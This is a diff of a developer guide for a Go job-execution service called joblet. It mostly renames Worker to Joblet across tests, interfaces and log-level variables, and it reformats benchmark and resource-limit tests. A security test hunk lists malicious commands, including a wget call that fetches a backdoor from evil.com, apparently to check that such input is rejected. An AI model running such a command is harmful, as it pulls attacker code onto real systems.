@@ -347,10 +347,10 @@ tt.validate(t, store)
 #### 2. Integration Tests
 
 ```go
-// Test file: test/integration/worker_test.go
+// Test file: test/integration/joblet_test.go
 // +build integration
 
-func TestWorker_JobLifecycle(t *testing.T) {
+func TestJoblet_JobletLifecycle(t *testing.T) {
 if runtime.GOOS != "linux" {
 t.Skip("Integration tests require Linux")
 }
@@ -358,7 +358,7 @@ t.Skip("Integration tests require Linux")
 // Setup test environment
 cfg := testConfig(t)
 store := state.New()
-joblet := core.NewWorker(store, cfg)
+joblet := core.NewJoblet(store, cfg)
 
 ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 defer cancel()
@@ -557,7 +557,7 @@ return j.Timeout - elapsed
 
 ```go
 // internal/joblet/core/interfaces/joblet.go
-type Worker interface {
+type Joblet interface {
 StartJob(ctx context.Context, command string, args []string,
 maxCPU, maxMemory, maxIOBPS int32) (*domain.Job, error)
 StopJob(ctx context.Context, jobId string) error
@@ -571,7 +571,7 @@ SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error
 
 ```go
 // internal/joblet/core/linux/joblet.go
-func (w *Worker) SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error {
+func (w *Joblet) SetJobTimeout(ctx context.Context, jobId string, timeout time.Duration) error {
 log := w.logger.WithFields("jobId", jobId, "timeout", timeout)
 log.Debug("setting job timeout")
 
@@ -782,7 +782,7 @@ CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags="-w -s" -o bin/
 
 ```bash
 # Run server with debug logging
-WORKER_LOG_LEVEL=DEBUG ./bin/joblet
+JOBLET_LOG_LEVEL=DEBUG ./bin/joblet
 
 # Debug specific component
 go test -v -run TestStore_CreateNewJob ./internal/joblet/state/
@@ -804,7 +804,7 @@ go tool pprof mem.prof
 ```bash
 # Enable debug mode in production
 sudo systemctl edit joblet
-# Add: Environment=WORKER_LOG_LEVEL=DEBUG
+# Add: Environment=JOBLET_LOG_LEVEL=DEBUG
 
 # Monitor job execution
 sudo journalctl -u joblet -f | grep "jobId"
@@ -892,30 +892,30 @@ i++
 }
 
 func BenchmarkStore_GetJob(b *testing.B) {
-store := state.New()
-
-// Setup
-for i := 0; i < 1000; i++ {
-job := &domain.Job{
-Id:      fmt.Sprintf("job-%d", i),
-Command: "echo",
-Status:  domain.StatusRunning,
-}
-store.CreateNewJob(job)
-}
-
-b.ResetTimer()
-b.RunParallel(func (pb *testing.PB) {
-i := 0
-for pb.Next() {
-jobId := fmt.Sprintf("job-%d", i%1000)
-_, exists := store.GetJob(jobId)
-if !exists {
-b.Errorf("job not found: %s", jobId)
-}
-i++
-}
-})
+   store := state.New()
+   
+   // Setup
+   for i := 0; i < 1000; i++ {
+      job := &domain.Job{
+         Id:      fmt.Sprintf("job-%d", i),
+         Command: "echo",
+         Status:  domain.StatusRunning,
+      }
+      store.CreateNewJob(job)
+   }
+   
+   b.ResetTimer()
+   b.RunParallel(func (pb *testing.PB) {
+   i := 0
+   for pb.Next() {
+      jobId := fmt.Sprintf("job-%d", i%1000)
+      _, exists := store.GetJob(jobId)
+      if !exists {
+        b.Errorf("job not found: %s", jobId)
+      }
+      i++
+   }
+   })
 }
 ```
 
@@ -995,7 +995,7 @@ maliciousCommands := []string{
 "`wget evil.com/backdoor`",
 }
 
-joblet := setupTestWorker(t)
+joblet := setupTestJoblet(t)
 
 for _, cmd := range maliciousCommands {
 t.Run(fmt.Sprintf("command_%s", cmd), func (t *testing.T) {
@@ -1010,31 +1010,32 @@ if err == nil {
 }
 
 func TestResourceLimits(t *testing.T) {
-tests := []struct {
-name      string
-maxMemory int32
-expectErr bool
-}{
-{"normal_limit", 512, false},
-{"excessive_limit", 999999999, true},
-{"negative_limit", -1, true},
+   tests := []struct {
+         name      string
+         maxMemory int32
+         expectErr bool
+      }{
+      {"normal_limit", 512, false},
+      {"excessive_limit", 999999999, true},
+      {"negative_limit", -1, true},
+   }
+   
+   joblet := setupTestJoblet(t)
+   
+   for _, tt := range tests {
+      t.Run(tt.name, func (t *testing.T) {
+         _, err := joblet.StartJob(context.Background(), "echo", []string{"test"},
+         0, tt.maxMemory, 0)
+         
+         if tt.expectErr {
+           assert.Error(t, err)
+         } else {
+           assert.NoError(t, err)
+         }
+      })
+   }
 }
 
-joblet := setupTestWorker(t)
-
-for _, tt := range tests {
-t.Run(tt.name, func (t *testing.T) {
-_, err := joblet.StartJob(context.Background(), "echo", []string{"test"},
-0, tt.maxMemory, 0)
-
-if tt.expectErr {
-assert.Error(t, err)
-} else {
-assert.NoError(t, err)
-}
-})
-}
-}
 ```
 
 ### Code Review Checklist
